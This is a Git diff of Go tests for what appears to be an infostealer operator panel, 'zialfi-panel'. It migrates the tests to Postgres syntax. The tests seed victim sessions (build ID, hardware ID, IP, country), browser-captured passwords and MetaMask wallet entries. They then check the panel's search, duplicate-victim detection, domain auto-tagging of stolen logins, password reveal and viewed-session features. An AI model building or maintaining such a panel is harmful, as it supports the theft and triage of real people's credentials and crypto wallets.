@@ -8,21 +8,22 @@ import (
 	"testing"
 
 	"github.com/google/uuid"
+	"zialfi-panel/internal/testutil"
 )
 
 func TestAdvancedSearch_Basic(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
+		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
-		VALUES (?, ?, 'https://example.com', 'alice', 'secret', 'chrome')`, uuid.New().String(), sid)
+		VALUES ($1, $2, 'https://example.com', 'alice', 'secret', 'chrome')`, uuid.New().String(), sid)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -62,7 +63,7 @@ func TestAdvancedSearch_Basic(t *testing.T) {
 }
 
 func TestAdvancedSearch_FilterByOS(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	for i := 0; i < 3; i++ {
@@ -72,7 +73,7 @@ func TestAdvancedSearch_FilterByOS(t *testing.T) {
 			os = "win11"
 		}
 		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-			VALUES (?, 'b1', ?, ?, 'user', '1.2.3.4', 'US', datetime('now'))`, sid, "hw-"+sid[:8], os)
+			VALUES ($1, 'b1', $2, $3, 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid, "hw-"+sid[:8], os)
 		if err != nil {
 			t.Fatal(err)
 		}
@@ -99,19 +100,19 @@ func TestAdvancedSearch_FilterByOS(t *testing.T) {
 }
 
 func TestAdvancedSearch_Pagination(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
+		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	for i := 0; i < 5; i++ {
 		_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
-			VALUES (?, ?, 'test.com', 'user', 'pass', 'chrome')`, uuid.New().String(), sid)
+			VALUES ($1, $2, 'test.com', 'user', 'pass', 'chrome')`, uuid.New().String(), sid)
 		if err != nil {
 			t.Fatal(err)
 		}
@@ -141,7 +142,7 @@ func TestAdvancedSearch_Pagination(t *testing.T) {
 }
 
 func TestDuplicateDetection_ByHWID(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid1 := uuid.New().String()
@@ -149,17 +150,17 @@ func TestDuplicateDetection_ByHWID(t *testing.T) {
 	sid3 := uuid.New().String()
 
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'DUP-HWID', 'win10', 'user1', '1.2.3.4', 'US', datetime('now'))`, sid1)
+		VALUES ($1, 'b1', 'DUP-HWID', 'win10', 'user1', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid1)
 	if err != nil {
 		t.Fatal(err)
 	}
 	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'DUP-HWID', 'win10', 'user2', '5.6.7.8', 'US', datetime('now'))`, sid2)
+		VALUES ($1, 'b1', 'DUP-HWID', 'win10', 'user2', '5.6.7.8', 'US', CURRENT_TIMESTAMP)`, sid2)
 	if err != nil {
 		t.Fatal(err)
 	}
 	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'DUP-HWID', 'win11', 'user3', '9.10.11.12', 'DE', datetime('now'))`, sid3)
+		VALUES ($1, 'b1', 'DUP-HWID', 'win11', 'user3', '9.10.11.12', 'DE', CURRENT_TIMESTAMP)`, sid3)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -192,19 +193,19 @@ func TestDuplicateDetection_ByHWID(t *testing.T) {
 }
 
 func TestDuplicateDetection_ByIP(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid1 := uuid.New().String()
 	sid2 := uuid.New().String()
 
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hw1', 'win10', 'user1', '10.0.0.1', 'US', datetime('now'))`, sid1)
+		VALUES ($1, 'b1', 'hw1', 'win10', 'user1', '10.0.0.1', 'US', CURRENT_TIMESTAMP)`, sid1)
 	if err != nil {
 		t.Fatal(err)
 	}
 	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hw2', 'win10', 'user2', '10.0.0.1', 'US', datetime('now'))`, sid2)
+		VALUES ($1, 'b1', 'hw2', 'win10', 'user2', '10.0.0.1', 'US', CURRENT_TIMESTAMP)`, sid2)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -233,12 +234,12 @@ func TestDuplicateDetection_ByIP(t *testing.T) {
 }
 
 func TestDuplicateDetection_NoDuplicates(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'UNIQUE-HWID', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
+		VALUES ($1, 'b1', 'UNIQUE-HWID', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -259,7 +260,7 @@ func TestDuplicateDetection_NoDuplicates(t *testing.T) {
 }
 
 func TestDomainDetect_CreateListDelete(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	createBody := `{"domain":"steamcommunity.com","tag":"Steam","color":"#FF0000"}`
@@ -310,10 +311,10 @@ func TestDomainDetect_CreateListDelete(t *testing.T) {
 }
 
 func TestDomainDetect_AutoTag(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
-	_, err := d.Exec("INSERT INTO domain_detect (id, domain, tag, color) VALUES (?, ?, ?, ?)",
+	_, err := d.Exec("INSERT INTO domain_detect (id, domain, tag, color) VALUES ($1, $2, $3, $4)",
 		uuid.New().String(), "example.com", "Test", "#00FF00")
 	if err != nil {
 		t.Fatal(err)
@@ -321,13 +322,13 @@ func TestDomainDetect_AutoTag(t *testing.T) {
 
 	sid := uuid.New().String()
 	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
+		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
-		VALUES (?, ?, 'https://example.com/login', 'alice', 'secret', 'chrome')`, uuid.New().String(), sid)
+		VALUES ($1, $2, 'https://example.com/login', 'alice', 'secret', 'chrome')`, uuid.New().String(), sid)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -351,18 +352,18 @@ func TestDomainDetect_AutoTag(t *testing.T) {
 }
 
 func TestSessionDetail_PasswordReveal(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
+		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
-		VALUES (?, ?, 'https://example.com', 'alice', 'mysecretpass', 'chrome')`, uuid.New().String(), sid)
+		VALUES ($1, $2, 'https://example.com', 'alice', 'mysecretpass', 'chrome')`, uuid.New().String(), sid)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -380,8 +381,8 @@ func TestSessionDetail_PasswordReveal(t *testing.T) {
 	passwords := resp["passwords"].([]any)
 	if len(passwords) > 0 {
 		p := passwords[0].(map[string]any)
-		if p["password_value"] != "***HIDDEN***" {
-			t.Errorf("expected hidden password, got %v", p["password_value"])
+		if p["password_value"] != nil && p["password_value"] != "" {
+			t.Errorf("expected hidden password to be empty, got %v", p["password_value"])
 		}
 	}
 
@@ -404,18 +405,18 @@ func TestSessionDetail_PasswordReveal(t *testing.T) {
 }
 
 func TestSessionDetail_WalletIcons(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
+		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO wallets (id, session_id, name, path)
-		VALUES (?, ?, 'MetaMask', '/path/mm')`, uuid.New().String(), sid)
+		VALUES ($1, $2, 'MetaMask', '/path/mm')`, uuid.New().String(), sid)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -444,12 +445,12 @@ func TestSessionDetail_WalletIcons(t *testing.T) {
 }
 
 func TestSessionMarkViewed(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
+		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -472,27 +473,27 @@ func TestSessionMarkViewed(t *testing.T) {
 	}
 
 	var viewed int
-	d.QueryRow("SELECT viewed FROM sessions WHERE id = ?", sid).Scan(&viewed)
+	d.QueryRow("SELECT viewed FROM sessions WHERE id = $1", sid).Scan(&viewed)
 	if viewed != 1 {
 		t.Errorf("expected viewed=1 in db, got %d", viewed)
 	}
 }
 
 func TestSessionList_UnviewedFilter(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid1 := uuid.New().String()
 	sid2 := uuid.New().String()
 
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at, viewed)
-		VALUES (?, 'b1', 'hw1', 'win10', 'user1', '1.2.3.4', 'US', datetime('now'), 1)`, sid1)
+		VALUES ($1, 'b1', 'hw1', 'win10', 'user1', '1.2.3.4', 'US', CURRENT_TIMESTAMP, 1)`, sid1)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at, viewed)
-		VALUES (?, 'b1', 'hw2', 'win11', 'user2', '5.6.7.8', 'DE', datetime('now'), 0)`, sid2)
+		VALUES ($1, 'b1', 'hw2', 'win11', 'user2', '5.6.7.8', 'DE', CURRENT_TIMESTAMP, 0)`, sid2)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -507,14 +508,14 @@ func TestSessionList_UnviewedFilter(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	items := resp["items"].([]any)
+	items := resp["sessions"].([]any)
 	if len(items) != 1 {
 		t.Errorf("expected 1 unviewed session, got %d", len(items))
 	}
 }
 
 func TestFilterPresets(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	req := httptest.NewRequest(http.MethodGet, "/api/filter-presets", nil)
@@ -550,12 +551,12 @@ func TestFilterPresets(t *testing.T) {
 }
 
 func TestSessionDetail_ViewedField(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	sid := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
+		VALUES ($1, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -579,7 +580,7 @@ func TestSessionDetail_ViewedField(t *testing.T) {
 }
 
 func TestSessionList_DuplicateCount(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupTestRouter(t, d, nil)
 
 	hwid := "DUP-HWID-001"
@@ -587,13 +588,13 @@ func TestSessionList_DuplicateCount(t *testing.T) {
 	sid2 := uuid.New().String()
 
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', ?, 'win10', 'user1', '1.2.3.4', 'US', datetime('now'))`, sid1, hwid)
+		VALUES ($1, 'b1', $2, 'win10', 'user1', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`, sid1, hwid)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', ?, 'win11', 'user2', '5.6.7.8', 'DE', datetime('now'))`, sid2, hwid)
+		VALUES ($1, 'b1', $2, 'win11', 'user2', '5.6.7.8', 'DE', CURRENT_TIMESTAMP)`, sid2, hwid)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -608,7 +609,7 @@ func TestSessionList_DuplicateCount(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	items := resp["items"].([]any)
+	items := resp["sessions"].([]any)
 	for _, item := range items {
 		it := item.(map[string]any)
 		if it["hwid"] == hwid {
